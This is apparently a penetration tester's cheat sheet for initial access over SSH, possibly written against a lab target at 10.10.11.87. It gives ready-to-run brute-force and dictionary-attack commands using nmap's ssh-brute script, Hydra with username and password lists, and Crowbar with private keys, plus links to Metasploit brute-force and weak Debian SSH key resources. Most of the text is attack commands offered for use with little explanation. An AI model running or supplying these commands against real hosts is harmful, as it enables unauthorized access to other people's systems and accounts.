# Initial Access

## SSH

### NMAP NSE Brute for SSH


sudo nmap 10.10.11.87 --script ssh-brute.nse

### Dictionary attack with Hydra

hydra ssh://10.10.11.87 -L usernames.txt -P passwords.txt

### Brute Force attack with MSF

https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d

### Private Public Key

https://github.com/g0tmi1k/debian-ssh/blob/master/README.md

Crowbar usage: 

crowbar -b sshkey -s <TARGET_IP> -u <username> -k <path/to/private/key>

